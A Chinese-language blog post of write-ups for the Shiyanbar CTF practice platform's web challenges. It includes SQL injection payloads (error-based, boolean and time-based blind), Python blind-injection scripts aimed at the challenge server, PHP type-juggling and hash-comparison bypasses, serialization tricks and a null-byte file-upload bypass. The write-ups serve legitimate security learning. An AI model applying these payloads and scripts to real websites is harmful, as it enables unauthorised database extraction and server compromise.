---
title: 实验吧 Web Write Up
date: 2018-03-19 15:01:27
categories: Write Up
tags:
 - ctf
 - wp
description:
---
[实验吧](http://www.shiyanbar.com/ctf/practice)
记录一下在实验吧中学习的过程和自己的理解
<!-- more -->

### 简单的登录题

<br>

### 后台登录
进入页面，只需要提交密码，第一眼感觉是不是弱口令或者纯数字爆破。
右键源代码，发现提示的源码
```php
$password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result=mysqli_query($link,$sql);
	if(mysqli_num_rows($result)>0){
		echo 'flag is :'.$flag;
    }
    
	else{
		echo '密码错误!';
	}
```
主要关键点是可控变量只能是password,但是经过md5加密后就没有机会了。思路可能出在md5中设置的true，或者这条路是一个死胡同。果然google
找到[一篇描述的文章](https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html)
总结下来就是
首先
md5()中第二个参数是如果被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。
简单的说如果设置为true，就是先对字符串进行md5加密，返回了32字符十六进制数字形式，在将其转换为字符串返回。
```php
var_dump(md5("ffifdyop")); //string(32) "276f722736c95d99e921722cf9ed621c"
// 上面的字符串丢到16进制转换为字符串的在线工具中，也是得到相同的结果
var_dump(md5("ffifdyop", true)); // string(16) "'or'6蒥欓!r,BS"
```
如果结果是这样最后拼凑的sql语句会变成`SELECT * FROM admin WHERE username = 'admin' and password = ''or'6蒥欓!r,BS'`
以上条件始终成立。



<br>

### 加了料的报错注入
发现右键源代码中给出了一个提示
`<!-- $sql="select * from users where username='$username' and password='$password'";  -->`

```
1. 得到注入点
username=1&password=2'   # 页面报错
username=1&password=2'||'1 # 提示登录成功 You are our member, welcome to enter
直接登录成功了，然后仔细看明白了为什么
因为运算优先级，select * from user where username='1' and password='2'||'1'    先执行and,在运算or
(username='1' and password='2') || '1'
false || '1'
false || true
true

2. 根据报错的特性，可以尝试报错注入了
这边把别人总结的10个报错函数都使用了，只有这个能用，其他九个应该是被过滤了
username=123&password=1'||exp(~(select * from(select database())a))||'0   #error_based_hpf
username=123&password=1'||exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema in('error_based_hpf'))a))||'0  #ffll44jj,users
username=123&password=1'||exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name in('ffll44jj'))a))||'0   #value
```

<br>

### 认真一点！
总体参考pcat师傅的思路，自己在原有基础上边改边思考，过程学习到很多
#### 判断注入点
```sql
id=1 # You are in ................
id=0 # You are not in ...............
id=2 # You are not in ...............
显然表中只有一条数据，没有数据的情况会报出You are not in ...............

id=1aaa # You are in ................
由于ID字段为主键并且是数字类型，和字符比较时被隐式转换为 1。说明注入点是字符型
```

#### 猜解过滤字符
fuzz测试一下被过滤的字符

![fuzz-1](fuzz-1.png)


```sql
逐步构建一个的payload
id=0' or '1   # Sql injection detected!
id=0'or'1     # 返回You are not in可能是or问题，并且证明空格被过滤

尝试重写和大小写or
id=0'oorr'1   # You are in
id=0'Or'1     # You are in
说明or是被替换为空,这边是pcat师傅的思路，觉得很好
我直接使用了&&来替换，但是后期构建语句的时候因为or被替换，很难排错

绕过空格
id=0'/**/Or/**/'1  # You are not in ,如果能代替，执行肯定正常，所以失败
id=0'+Or+'1   # 同上
id=0'%09or%09'1 # 返回正常，绕过成功

在利用这个语句fuzz测试是否还存在字符是被替换成空的
id=0'Or''='    # You are in
id=0'Or'or'='  # 如果or是被替换为空，返回You are in，反之
```

![fuzz-2](fuzz-2.png)

这些字符都会替换为空，接下来的payload就很好构建了。

写出脚本
```python
import requests
import re


result = ""
url = "http://ctf5.shiyanbar.com/web/earnest/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
for i in range(1, 100):
    low = 32
    high = 126
    mid = (low + high) >> 1
    while mid < high:
        # payload = "id=0'%09oorr%09(ascii(mid((database())from({0})foorr(1)))>{1})='1"
        # ctf_sql_bool_blind
        # payload = "id=0'%09oorr%09(ascii(mid((select%09group_concat(table_name)%09from%09infoorrmation_schema.tables%09where%09table_schema='ctf_sql_bool_blind')from({0})foorr(1)))>{1})='1"
        # fiag,users
        # payload = "id=0'%09oorr%09(ascii(mid((select%09group_concat(column_name)%09from%09infoorrmation_schema.columns%09where%09table_name='fiag')from({0})foorr(1)))>{1})='1"
        # fL$4G
        payload = "id=0'%09oorr%09(ascii(mid((select%09group_concat(fL$4G)%09from%09fiag)from({0})foorr(1)))>{1})='1"
        payload = payload.format(i, mid)
        s = requests.post(url, data=payload, headers=headers)
        content = s.text
        content = re.findall(r"You are not in", content)
        if content:
            # 返回为false，说明不成立，缩小上线
            high = mid
        else:
            # 缩小下线
            low = mid + 1
        mid = (low + high) >> 1
    result += chr(mid)
    print(result)
```
```sql
测试脚本使用的payload
id=1'%26%26(select(case(1)when(1)then(1)else(0)end))%26%26'1
id=0'%09oorr%09(ascii(mid((database())from(1)foorr(1)))>1)='1
id=0'%09oorr%09(ascii(mid((select%09group_concat(table_name)%09from%09infoorrmation_schema.tables%09where%09table_schema='ctf_sql_bool_blind')from(1)foorr(1)))>1)='1
id=0'%09oorr%09(ascii(mid((select%09group_concat(column_name)%09from%09infoorrmation_schema.columns%09where%09table_name='fiag')from(1)foorr(1)))>1)='1
id=0'%09oorr%09(ascii(mid((select%09group_concat(fL$4G)%09from%09fiag)from(1)foorr(1)))>1)='1
```
<br>

### 你真的会PHP吗？
进入页面，BP看HTTP响应头，会看见提示页面。访问得到源码：
```php
$info = "";
$req = [];
$flag="xxxxxxxxxx";

ini_set("display_error", false);
error_reporting(0);

# 如果$_POST['number']参数则返回提示
if(!isset($_POST['number'])){
   header("hint:6c525af4059b4fe7d8c33a.txt");

   die("have a fun!!");

}

# 第一个foreach循环，可以忽略，具体为自定义了$_POST数组，在遍历循环
# 如果不定义直接循环$_POST也是同样的
foreach([$_POST] as $global_var) {
    foreach($global_var as $key => $value) {
        # trim()去除字符串首尾处的空白字符（或者其他字符）空格 \t \n \r \0 \x0B
        $value = trim($value);

        # 利用短路运算符
        # 1. 如果is_string($value)返回true，才会完成后面的赋值过程
        is_string($value) && $req[$key] = addslashes($value);

        # addslashes()使用反斜线引用字符串,单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）。
        # is_string()检测变量是否是字符串
    }
}


# 把传入的数字进行反转比较，比如传入123456，先取1和6比较，不想等则返回false。相等继续循环
function is_palindrome_number($number) {
    $number = strval($number);
    $i = 0;
    $j = strlen($number) - 1;
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}


# is_numeric()是数字和数字字符串则返回 TRUE，否则返回 FALSE。
# 2. 要传入不是数字和数字字符串条件成立。注意是：$_REQUEST
if(is_numeric($_REQUEST['number'])){

   $info="sorry, you cann't input a number!";

# 3. $req['number'] 与 自身先转为数字在转字符串的内容 等于  才能满足条件。
}elseif($req['number']!=strval(intval($req['number']))){

     $info = "number must be equal to it's integer!! ";

}else{
     # strrev()反转字符串
     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));

     # 3. 反转后的两个结果要相同   (这里是把整个值转换后，反转在比较)
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }else{

          # 4. 本身需要与反转后的结果不相同   (这里是单个数比较)
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!";
          }else{
             $info=$flag;
          }
     }

}

echo $info;
```
上面源码审计后，得到几个需要满足的要求：
1.  传入的值满足is_string()
2. `is_numeric($_REQUEST['number']) == false`  传入的原始POST参数，不是数字或数字字符串
3. `$req['number'] == strval(intval($req['number']))`   `$req['number']` 与 自身先转为数字在转字符串的内容 等于
4. `intval($req["number"]) == intval(strrev($req["number"]))`  本身与反转后相同(这里是把整个值转换后比较)
5. `is_palindrome_number($req["number"]) == false`   本身需要与反转后的结果不相同   (这里是单个数比较)

同时还有一些细节，在开始的foreach中对参数进行了
1. `$value = trim($value);`
2. `addslashes($value)`

所以条件2 3，可以轻松绕过。例如传入`123%20`,原始POST请求，会不满足条件1。
而`$req['number']`经过`trim()`的参数后变为123，则满足了条件2。

关于条件4 5，是看了师傅们的wp。利用的是int类型的边界值2147483647，例如
```
$a = '111111111111';
var_dump(intval($a));  //int(2147483647)
```
也就是说当我传入的值是2147483647，那么反转之后7463847412，但是intval()的时候，超过了边界值，所以`intval(strrev('2147483647') == 2147483647`，条件4就满足。
条件4就自然而然就满足了。因为条件5是单个数字比较，那么必然不相同。

这边我想不到is_string()和addslashes()的意义在哪里

最后得到payload为`number=2147483647%20`
得到flag


<br>

### 登陆一下好吗??
题目有两种解题思路，第二种从实验吧WP中学习到，很不错的想法。

**自己的解法**

进入页面尝试登录一下，发送请求之后出现给出提示的界面。

这边使用常规方式判断注入点好像不行。所以开始我只是先猜测他语句是
`SELECT * FROM users WHERE username = '' AND password = ''`
提示也说了，过滤了很多东西，所以拿or随便尝试一下。`username=1or&password=1`
发现or被过滤，大小写或者重写都无法绕过。所以利用BP进行Fuzz测试还过滤了那些内容。
发现username和password字段都被过滤内容`or || # -- select union *`
select和union被过滤，所以可以把思路调整一下,构建万能密码先登录进入。
而因为MYSQL的隐式转换可以利用=号和单引号来构建密码。原理如下
```sql
username = '' = ''
(username = '') = ''
false = ''
false = false
true
```
所以构建payload为`username='='&password='='`
页面显示所有的用户名，并且得到了flag。

**第二种解法**
很不错的思路，原本的SQL语句是`SELECT * FROM users WHERE username = '' AND password = ''`
由于过滤中没有过滤转义符，所以我们可以把`username=''`中最后的单引号转义，那么就会变成`username = '\' AND password = ''`
那么后面的password条件就被变为字符串。只是最后有一个单引号，可以通过password字段传入来闭合。
最后构建payload `username=\&password=='`，凭借后变为`username = '\' AND password = '=''`
可以直接看作为`username = ''=''`，永真所以返回所有用户信息。
原来的大佬是使用^来异或运算`username = '\' AND password = '^'0'`
在SQL运算顺序中先进行异或运算，所以`'\' AND password = '^'0'` 结果为0
那么条件就变为`username = 0`，因为username不是整数类型，而它和数字比较，会被转换为数字，如果不是数字开头的话就会被当为0
既就是所有纯字符和0开头的数据都会被匹配成功。
数据库里面的3条积累都满足，所以都显示出来，得到flag



<br>

### who are you?
提示说会把IP进入到数据库，所以很明显的insert into注入。可以根据盲注或者报错注入或者插入的数据能回显
构建请求包
```http
GET /web/wonderkun/index.php HTTP/1.1
Host: ctf5.shiyanbar.com
X-Forwarded-For: 123
Connection: close
Upgrade-Insecure-Requests: 1
```
页面中显示123,开始注入,判断注入点

```
'   # 页面没有报错信息，不能进行报错注入  页面也无法回显数据库的信息，所以猜测时间盲注
'+sleep(5) or '    # 页面执行了超过5s，确定注入点
```
利用bp fuzz测试下是否有过滤字符
发现只有逗号被过滤了。
然后在尝试使用if的过程中，发现，之后的内容被截断，包括逗号。
`'+if(1,sleep(5),1) or '`  页面回显`your ip is :'+if(1`
那么就不能使用逗号，所以利用case when来完成，继续构建payload
```
'+(select case when 1 then sleep(2) else 1 end) or '
'+(select case when (mid(database() from 1 for 1)='s') then sleep(2) else 1 end) or '
```
写出python脚本,10s是因为发现5s 8s得到的数据不太正常
```python
import requests

ALL = ' flagqwertyuiopsdhjkzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890`~!@#$%^&*()_+=[]{};\':\"<>?,./\\'
result = ''
url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'

for i in range(1, 100):
    for key in ALL:
        # payload = "'+(sleep(5)) or '"
        # print(result)

        # payload = "'+(select case when (mid(database() from %d for 1)='%s') then sleep(6) else 1 end) or '"%(i, key)
        # web4
        # payload = "'+(select case when (mid(group_concat(table_name) from %d for 1)='%s') then sleep(10) else 1 end from information_schema.tables where table_schema='web4') or '"%(i, key)
        # client_ipflag   flag前面应该有个逗号，无法检测出来，不知道为什么
        # payload = "'+(select case when (mid(group_concat(column_name) from %d for 1)='%s') then sleep(10) else 1 end from information_schema.columns where table_name='flag') or '"%(i, key)
        # flag
        payload = "'+(select case when (mid(group_concat(flag) from %d for 1)='%s') then sleep(10) else 100 end from flag) or '"%(i, key)
        # print(payload)
        header = {"X-Forwarded-For": payload}
        # 5 time
        try:
            requests.get(url, headers=header, timeout=10)
        except Exception as e:
            result += key
            print(result)
            break
print(result)
```
<br>


### 因缺思汀的绕过
右键源代码，发现源码文件source.txt，访问得到源码
```php
error_reporting(0);

if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
	echo '<form action="" method="post">'."<br/>";
	echo '<input name="uname" type="text"/>'."<br/>";
	echo '<input name="pwd" type="text"/>'."<br/>";
	echo '<input type="submit" />'."<br/>";
	echo '</form>'."<br/>";
	echo '<!--source: source.txt-->'."<br/>";
    die;
}

function AttackFilter($StrKey,$StrValue,$ArrReq){
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){
        print "水可载舟，亦可赛艇！";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){
    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
	die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql);
if (mysql_num_rows($query) == 1) {
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
	print "一颗赛艇！";
}
mysql_close($con);
```
发现其实只需要查询到一条数据，并且密码匹配就可以得到flag。
因为过滤条件中有union，所以无法利用union来构建一个用户进行登录。
但是可以使用with rollup来构建一个空的密码。
![withrollup](withrollup.png)

所以我们利用它还需要两个条件
1. 必须有数据，才能构建。所以利用`username=''=''`永真条件来得到所有用户数据
2. 利用limit来读取估计条目。逗号被过滤可以利用limit offset来绕过


最后构建payload为`uname='='' group by pwd with rollup limit 1 offset 0 #&pwd=`
调整offset来调整取得第几条数据，因为是构建的必定在最后一条。测试发现只有2个用户，所以取值2
得到flag


<br>

### 简单的sql注入之3
进入页面，提示说到底过滤了什么
还是先判断注入点
```sql
?id=1 # hello
?id=2 # hello
?id=3 # hello
?id=4 # 无回显
?id=4-1 # 无回显
?id=3aaaa # hello
?id=' # 出现报错信息，之后可以尝试报错注入
```
可以猜测有语句可能是这样`select * from users where id = ''`
开始判断过滤的情况
```
?id=0' or ''='' %23    # hello   对# = or 空格都没做过滤
```
利用bp做fuzz测试，发现大部分字符都没有被过滤，sleep过滤了，过滤会回显Don't!

直接尝试联合查询
```sql
?id=1' order by 3 %23 # 报错
?id=1' order by 2 %23 # 报错
?id=1' order by 1 %23 # 正常，只有一列
?id=0' union select 1 # 回显hello

我开始还想不明白，后来仔细一想，发现hello只是有数据的情况下会回显的内容
那么利用布尔盲注也是可行的，只不过报错注入效率更高，所以先尝试报错注入
```
那么就不能利用联合查询，那么利用报错注入
然后继续测试发现floor extractvalue updatexml都被过滤，然后geometrycollection没有被过滤
那么就直接利用他得到flag
```
?id=1' and  geometrycollection((select * from(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())a)b)) %23  #flag,web_1
?id=1' and  geometrycollection((select * from(select * from(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167)a)b)) %23 # flag,id
?id=1' and  geometrycollection((select * from(select * from(select group_concat(flag) from flag)a)b)) %23
```
<br>

### 简单的sql注入之2
还是先判断注入点
```sql
?id=1 # 回显用户1的数据，测试下来总共只有3条数据
?id=3a # 回显用户3的数据，但是ID回显是3a，说明ID的内容不是从数据库里面拿的\
?id='  # 出现报错信息，可以采取报错注入
'确认是字符型注入
```

继续构建payload,确定是否有字符被过滤
```sql
?id=3'||1%23 # 回显正常， 并且回显了3条数据，说明PHP拿数据是采用遍历的方式，并且没有过滤# || '
?id=3' or '1 # SQLi detected!
?id=3' || '1 # SQLi detected! 空格被过滤
?id=0'||''=' # 回显正常，利用fuzz测试，是否还存在其他字符被过滤
```
select ) 空格 + 被过滤
```
空格我直接利用了/**/来绕过，然后这边有个巨坑无法不地方，我始终想不明白
?id=0'/**/union/**/select/**/1%23   这样的语句能被执行了，但是单单输入select居然被过滤
继续测试发现 ?id=/**/select/**/ 这样同样select不会被过滤。同样 ) 也能这样绕过。很奇怪里面的检测规则
```
如果这样接下来就很好做了
```sql
?id=0'/**/order/**/by/**/2%23  #' 报错
?id=0'/**/order/**/by/**/1%23  #' 正常，确定一列
?id=0'/**/union/**/select/**/1%23 #' 回显字符1，继续注入
?id=0'/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/%23 #' flag,web_1
?id=0'/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167%23  #' flag,id
?id=0'/**/union/**/select/**/flag/**/from/**/flag%23  #' 得到flag
```

<br>

### 简单的sql注入
还是先判断注入点
```sql
?id=1   # 正常第一条数据
?id=1a  # 还是第一条数据
?id='=' # 全部数据
判断为字符型，总共三条数据
```
测试过滤字符
```sql
?id='||1%23 #' 报错，整条语句就两个单引号的点，最前或者最后，这样看出问题的可能是最后，注释符这块可能有问题，而且基本是被替换，不然应该会有别的信息出来
?id='||'%23'=' # 回显3条数据，果然
```
利用bp进行fuzz测试 发现就`# --`是被替换，那么直接闭合即可
```sql
由于最后闭合问题，我直接不测试列数，直接靠猜来查询表
?id=0' union select '1 # 页面回显ID: 0' '1  说明union select 被整个过滤
?id=1 union select 1 # ID: 1 1
?id=1 union 1 # ID: 1 1
?id=1 union1  # ID: 1 union1
上面测试结果显示，如果他们之后出现空格，才会被过滤，所以利用/**/，达到绕过
?id=1 union/**/1 # ID: 1 union/**/1

继续注入
?id=0' union/**/select/**/'1 # 页面回显1
?id=0' union/**/select/**/table_name from/**/information_schema.tables where/**/table_schema=database() and/**/'1  # use near '.tables where/**/=database() and/**/'1'' at
仔细一看是table_schema被替换成空了。为了方便，把整条语句仍进去看下回显，的确只有一个被替换

重写绕过
?id=0' union/**/select/**/table_name from/**/information_schema.tables where/**/tabtable_schemale_schema=database() and/**/'1 # flag,web_1

?id=0' union/**/select/**/column_name from/**/information_schema.columns where/**/table_name='flag # 发现information_schema.columns 和 column_name也被替换
?id=0' union/**/select/**/colucolumn_namemn_name from/**/informinformation_schema.columnsation_schema.columns where/**/table_name='flag # flag,id
?id=0' union/**/select/**/flag from/**/flag where/**/'1 # 得到flag
```
<br>

### 天下武功唯快不破
其实和简单，把响应头的内容解码，在POST到页面中可以得到flag。但是有时间限制，必须用脚本
但是最坑的是POST的key值是什么，我开始看了半天后来仔细看这绿色的字，我原本理解是base64解开左边是parameter，右边是key
`<!-- please post what you find with parameter:key -->`
然后试了半天，我的天

```python
import base64
import requests

url = 'http://ctf5.shiyanbar.com/web/10/10.php'
s = requests.Session()
r = s.get(url)
flag = base64.b64decode(r.headers['FLAG'])
print(flag)
flag = flag.split(':')
data = {'key': flag[1]}
print(data)
print(s.post(url, data=data).text)
```
<br>

### 让我进去
HASH长度扩展攻击，具体的原理自己还没搞明白。。。待补充
[哈希长度扩展攻击的简介以及HashPump安装使用方法](https://www.cnblogs.com/pcat/p/5478509.html)

<br>

### 拐弯抹角
```php
// code by SEC@USTC

echo '<html><head><meta http-equiv="charset" content="gbk"></head><body>';

$URL = $_SERVER['REQUEST_URI'];
//echo 'URL: '.$URL.'<br/>';
$flag = "CTF{???}";

$code = str_replace($flag, 'CTF{???}', file_get_contents('./index.php'));
$stop = 0;

//这道题目本身也有教学的目的
//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的
//所以，第一个要求就是不得出现 ./
if($flag && strpos($URL, './') !== FALSE){
    $flag = "";
    $stop = 1;        //Pass
}

//第二，我们可以构造 \ 来代替被过滤的 /
//所以，第二个要求就是不得出现 ../
if($flag && strpos($URL, '\\') !== FALSE){
    $flag = "";
    $stop = 2;        //Pass
}

//第三，有的系统大小写通用，例如 indirectioN/
//你也可以用?和#等等的字符绕过，这需要统一解决
//所以，第三个要求对可以用的字符做了限制，a-z / 和 .
$matches = array();
preg_match('/^([0-9a-z\/.]+)$/', $URL, $matches);
if($flag && empty($matches) || $matches[1] != $URL){
    $flag = "";
    $stop = 3;        //Pass
}

//第四，多个 / 也是可以的
//所以，第四个要求是不得出现 //
if($flag && strpos($URL, '//') !== FALSE){
    $flag = "";
    $stop = 4;        //Pass
}

//第五，显然加上index.php或者减去index.php都是可以的
//所以我们下一个要求就是必须包含/index.php，并且以此结尾
if($flag && substr($URL, -10) !== '/index.php'){
    $flag = "";
    $stop = 5;        //Pass
}

//第六，我们知道在index.php后面加.也是可以的
//所以我们禁止p后面出现.这个符号
if($flag && strpos($URL, 'p.') !== FALSE){
    $flag = "";
    $stop = 6;        //Pass
}

//第七，现在是最关键的时刻
//你的$URL必须与/indirection/index.php有所不同
if($flag && $URL == '/indirection/index.php'){
    $flag = "";
    $stop = 7;        //Pass
}
if(!$stop) $stop = 8;

echo 'Flag: '.$flag;
echo '<hr />';
for($i = 1; $i < $stop; $i++)
    $code = str_replace('//Pass '.$i, '//Pass', $code);
for(; $i < 8; $i++)
    $code = str_replace('//Pass '.$i, '//Not Pass', $code);


echo highlight_string($code, TRUE);

echo '</body></html>';
```
其实我没怎么搞懂，这个应该跟apache有关系，当URL为`http://ctf5.shiyanbar.com/indirection/index.php/index.php`
apache从左到右解析，发现了第一个`index.php`后，就将内容指向到这，后面的内容应该被作为参数传递了。

<br>

### Forms
进入页面出现两个报错，都是参数没有传递。然后右键源代码，发现提交PIN的时候有两个参数，第二个参数肯定是显示源码的。
提交参数`PIN=1&showsource=1`,拿到源码
```php
$a = $_POST["PIN"];
if ($a == -19827747736161128312837161661727773716166727272616149001823847) {
    echo "Congratulations! The flag is $flag";
} else {
    echo "User with provided PIN not found.";
}
```
审计源码得到payload
`PIN=-19827747736161128312837161661727773716166727272616149001823847&showsource=1`


<br>

### 天网管理系统
进入页面，虽然尝试一下，没什么特别多的信息，右键源代码得到提示的源码
`<!-- $test=$_GET['username']; $test=md5($test); if($test=='0') -->`
这边有个坑人的点，就是明明是POST请求才行，这边利用PHP弱类型构建payload为`username=s878926199a`
它经过加密后变成`0e545993274517709034328855841020` 如果以0e开头的字符进行比较时候，会将该字符串进行科学技术法，既
`0*10^545993274517709034328855841020 == 0`，达到绕过条件，返回了一个URL`/user.php?fame=hjkleffifer`
直接访问，会发现源码
```php
$unserialize_str = $_POST['password'];
$data_unserialize = unserialize($unserialize_str);
if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???')
{
  print_r($flag);
}
```
简单分析其实就是传入一个序列化的数组，然后经过反序列化后，能满足条件即可。
因为???不知道，我开始猜测是admin，后来发现不是，在页面中也找不到其他提示，所以直接通过弱类型来完成
因为`true='abc'`返回true
所以先构建代码
```php
$arr = array('user' => true, 'pass' => true);
echo serialize($arr); //a:2:{s:4:"user";b:1;s:4:"pass";b:1;}
```
然后我在user页面提交半天，又验证了半天，发现都不行，原来还要去首页去提交... 我还是太年轻
最后的payload为`username=s878926199a&password=a:2:{s:4:"user";b:1;s:4:"pass";b:1;}`


<br>

### 忘记密码了
进入页面会发现一个提交邮箱页面，直接右键源代码
看见了两个比较显眼的东西，一个是VIM编辑器，一个是管理员的邮箱。
直接提交管理员邮箱，发现没得到什么信息。
然后就去找step1.php的vim临时文件或者备份文件，也没有。这边很疑惑
然后试着提交一个自己的邮箱，发现给出了`step2.php`页面
访问发现会直接跳到step1.php中，然后bp看step2.php文件，发现有一张`submit.php`页面
然后试着提交`submit.php`中的参数，发现fail，那么试着看是否有`submit.php`和`step2.php`的源码
发现只有`submit.php`有
```php

........这一行是省略的代码........

/*
如果登录邮箱地址不是管理员则 die()
数据库结构

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
(1, '****不可见***', '***不可见***', 0);
*/


........这一行是省略的代码........

if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```
其中创建表的适合token默认值是0，所以我们只要传入0就行
但是又需要token的长度等于10，并且不能等于0,所以可以采用科学计数法来绕过
`0e12345678`与其他字符串比较时，会转换为科学计数法，既0*10^12345678 == 0 ，所以满足条件2
在传入数据库时，因为token默认是int类型，在MYSQL中int类型和字符串进行比较时，字符串会隐式转换，`0e12345678`会转换为0
所以能查出数据，得到flag。
最终的payload为`emailAddress=admin@simplexue.com&token=0e12345678`
也可以用16进制的方式`emailAddress=admin@simplexue.com&token=0x00000000`
16进制格式的字符串和其他字符进行比较时，会自动转换为10进制在进行比较

最后在看了下别人的payload，感觉学到了`emailAddress=admin@simplexue.com&token=0000000000`


<br>

### Once More
```php
if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
	{
		echo '<p>You password must be alphanumeric</p>';
	}
	else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
	{
		if (strpos ($_GET['password'], '*-*') !== FALSE)
		{
			die('Flag: ' . $flag);
		}
		else
		{
			echo('<p>*-* have not been found</p>');
		}
	}
	else
	{
		echo '<p>Invalid password</p>';
	}
}
```
给了两个提示很明显，总共利用了两个点ereg()的%00截断，和科学计数法的一个技巧
传入payload为`password=9e9%00*-*`。
由于%00会截断ereg()的验证，也就是说验证到%00就停止了，所以满足条件1
字符串长度不说，为什么`9e9%00*-* > 9999999`?因为当以9e开头(8e1e都可以，这种形式)的字符串与其他数字进行比较时，该字符会先被转换为科学计数法计算后，在比较
，这边还有一个点就是后面明明还存在字符串，测试下来的结果是，后面的字符串会被忽略，取前面9e\d+的结果来运算，那么就是`9e9 > 9999999` = `9*10^9 > 9999999`
所以满足条件，至于*-*就自然而然满足了。

<br>

### Guess Next Session
```php
session_start();
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}

mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
```
需要Session和password相等,Session的内容是存储在服务端的，怎么判断你存在的是哪个session又是根据你的cookie
你传入的cookie来查找你的session值。
所以我们可以控制传入的Cookie，来让服务端的Session获取值为空。只需要虽然该一下Session的内容，让服务器找不到对应的Session值
在传入password参数也为空。两者就想同了。


<br>

### FALSE
```php
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
	echo '<p>Login first!</p>';
```
传入参数`name[]=1&password[]=2`，利用了sha1()传入数组会返回NULL，所以NULL==NULL，成立。
再是既然传入了数组，数组和数组进行比较时，需要KEY对应的VALUE相等，才会相同。1和2不相同，所以返回FALSE。
得到flag。

<br>

### 上传绕过
观察了一下POST的数据包，发现有登录目录，所以先尝试了一下目录截断的绕过
发现成功，其实就是在/uploads/后面加上%00(可以先输入一个空格，在BP的HEX界面中找到这个空格改为00即可)
当系统去验证文件名是否合法时，会取php.jpg去验证，当真实保存在本地的时候,%00会截断最后保存下来是php.php

不过这题目返回的内容好像有问题，其实你传一个正常文件和改了存储路径请求包，返回的存储路径也是/uploads/xxx.php
```http
POST /web/upload/upload.php HTTP/1.1
Host: ctf5.shiyanbar.com
Referer: http://ctf5.shiyanbar.com/web/upload/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------255481258587
Content-Length: 402

-----------------------------255481258587
Content-Disposition: form-data; name="dir"

/uploads/php.php这里利用%00截断
-----------------------------255481258587
Content-Disposition: form-data; name="file"; filename="php.jpg"
Content-Type: image/jpeg

<?php phpinfo() ?>
-----------------------------255481258587
Content-Disposition: form-data; name="submit"

Submit
-----------------------------255481258587--
```


<br>

### NSCTF web200
根据加密运算写出解密运算
```php
function encode($str){
  $_o = strrev($str);
  for ($_0=0; $_0 < strlen($_o); $_0++) {
    $_c = substr($_o, $_0, 1);
    $__ = ord($_c) + 1;
    $_c = chr($__);
    $_ = $_.$_c;
  }
  return str_rot13(strrev(base64_encode($_)));
}
```
```php
function decode($str){
  $_ = base64_decode(strrev(str_rot13($str)));
  for ($i=0; $i < (strlen($_)); $i++) {
    $a = substr($_, $i, 1);
    $__ = ord($a);
    $a = chr($__ - 1);
    $temp = $temp.$a;
  }
  return strrev($temp);

}

$str = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
var_dump(decode($str));
```
<br>

### 程序逻辑问题
右键源代码能看见给的源码提示
```php
if($_POST[user] && $_POST[pass]) {
    $conn = mysql_connect("********", "*****", "********");
    mysql_select_db("phpformysql") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
}
$user = $_POST[user];
$pass = md5($_POST[pass]);

$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %s\n", mysql_error($conn));
    exit();
}
